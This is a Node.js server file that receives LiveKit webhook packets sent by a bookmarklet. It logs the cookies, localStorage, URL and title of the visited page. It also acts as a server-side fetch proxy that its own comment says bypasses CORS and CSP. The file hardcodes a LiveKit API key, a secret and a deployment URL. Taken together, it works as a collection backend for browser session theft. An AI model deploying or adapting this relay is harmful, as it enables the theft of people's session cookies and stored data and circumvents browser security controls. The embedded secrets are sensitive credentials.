var http = require('http');
var crypto = require('crypto');

var PORT = process.env.PORT || 8080;

// LiveKit credentials — hardcoded (same as Vercel project)
var LK_API_KEY    = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
var LK_API_SECRET = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
var LK_HTTP_URL   = 'https://jack-6u9u95rm.livekit.cloud';
var ROOM_NAME     = 'bookmark-room';

// ─── JWT helper (sign HS256 — no deps needed) ────────────────────────────────
function b64url(buf) {
  return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function makeJwt(payload) {
  var header = b64url(Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })));
  var body   = b64url(Buffer.from(JSON.stringify(payload)));
  var sig    = b64url(crypto.createHmac('sha256', LK_API_SECRET).update(header + '.' + body).digest());
  return header + '.' + body + '.' + sig;
}

function makeServerToken() {
  return makeJwt({
    iss: LK_API_KEY,
    sub: 'railway-server',
    jti: 'railway-' + Date.now(),
    exp: Math.floor(Date.now() / 1000) + 600,
    video: { roomCreate: true, roomList: true, roomAdmin: true, room: ROOM_NAME }
  });
}

// ─── Verify LiveKit webhook JWT signature ────────────────────────────────────
function verifyWebhookToken(token) {
  if (!token) return null;
  try {
    var parts = token.split('.');
    if (parts.length !== 3) return null;
    var expectedSig = b64url(crypto.createHmac('sha256', LK_API_SECRET).update(parts[0] + '.' + parts[1]).digest());
    if (expectedSig !== parts[2]) return null;
    return JSON.parse(Buffer.from(parts[1], 'base64').toString());
  } catch (e) { return null; }
}

// ─── Send data back to a participant via LiveKit HTTP API ────────────────────
function sendDataToRoom(data) {
  var jwt = makeServerToken();
  var body = JSON.stringify({
    room:  ROOM_NAME,
    data:  Buffer.from(JSON.stringify(data)).toString('base64'),
    kind:  1  // RELIABLE
  });
  return fetch(LK_HTTP_URL + '/twirp/livekit.RoomService/SendData', {
    method: 'POST',
    headers: {
      'Authorization': 'Bearer ' + jwt,
      'Content-Type': 'application/json'
    },
    body: body
  }).then(function(r) {
    console.log('[lk] SendData status: ' + r.status);
  }).catch(function(e) {
    console.error('[lk] SendData error: ' + e.message);
  });
}

// ─── Process incoming data from bookmarklet ──────────────────────────────────
function processData(msg) {
  var action  = msg.action  || 'unknown';
  var payload = msg.payload || {};
  console.log('[relay] action=' + action + ' from=' + (payload.url || '?'));

  if (action === 'data') {
    // Log everything received
    console.log('[data] URL:     ' + payload.url);
    console.log('[data] Title:   ' + payload.title);
    console.log('[data] Cookie:  ' + (payload.cookie || '').substring(0, 120));
    if (payload.localStorage) {
      console.log('[data] Storage: ' + payload.localStorage.substring(0, 200));
    }
    // Send ack back through LiveKit so bookmarklet knows it arrived
    sendDataToRoom({ action: 'ack', ok: true, message: 'Railway received', url: payload.url, ts: Date.now() });

  } else if (action === 'fetch') {
    // Bookmarklet asked server-side fetch (bypasses CORS/CSP)
    var targetUrl = payload.url || msg.url;
    console.log('[fetch] ' + targetUrl);
    fetch(targetUrl, {
      headers: Object.assign({ 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*' }, payload.headers || {})
    }).then(function(r) {
      return r.text().then(function(text) {
        var data;
        try { data = JSON.parse(text); } catch (e) { data = text.substring(0, 4000); }
        console.log('[fetch] ok ' + r.status);
        sendDataToRoom({ action: 'fetch_result', ok: true, status: r.status, data: data, ts: Date.now() });
      });
    }).catch(function(e) {
      sendDataToRoom({ action: 'fetch_result', ok: false, error: e.message, ts: Date.now() });
    });

  } else {
    console.log('[relay] unknown action: ' + action);
  }
}
// ─── HTTP server ─────────────────────────────────────────────────────────────
var server = http.createServer(function(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // Health check
  if (req.url === '/health' || req.url === '/') {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ ok: true, service: 'railway-livekit-receiver', ts: Date.now() }));
    return;
  }

  // LiveKit webhook receiver — match with or without query string
  var urlPath = req.url.split('?')[0];
  if ((urlPath === '/webhook' || urlPath === '/webhook/') && req.method === 'POST') {
    var body = '';
    req.on('data', function(c) { body += c; });
    req.on('end', function() {
      // Always respond 200 first so LiveKit doesn't retry
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('OK');

      // Log raw headers for debugging
      var authHeader = req.headers['authorization'] || '';
      console.log('[webhook] received, auth header present: ' + !!authHeader);
      console.log('[webhook] body length: ' + body.length);

      try {
        var event = JSON.parse(body);
        var evType = event.event || '';
        console.log('[webhook] event type: ' + evType);
        console.log('[webhook] full event: ' + JSON.stringify(event).substring(0, 500));

        if (evType === 'data_packet_received') {
          var rawData = event.dataPacket && event.dataPacket.data;
          if (rawData) {
            var decoded = Buffer.from(rawData, 'base64').toString('utf8');
            var msg = JSON.parse(decoded);
            processData(msg);
          }
        }
      } catch (e) {
        console.error('[webhook] parse error: ' + e.message + ' body: ' + body.substring(0, 200));
      }
    });
    return;
  }

  res.writeHead(404, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ ok: false, error: 'not found' }));
});

server.listen(PORT, function() {
  console.log('[server] Railway LiveKit receiver on port ' + PORT);
  console.log('[server] Webhook URL: https://xl-production.up.railway.app/webhook');
  console.log('[server] Register this URL in LiveKit Cloud dashboard -> Webhooks');
});
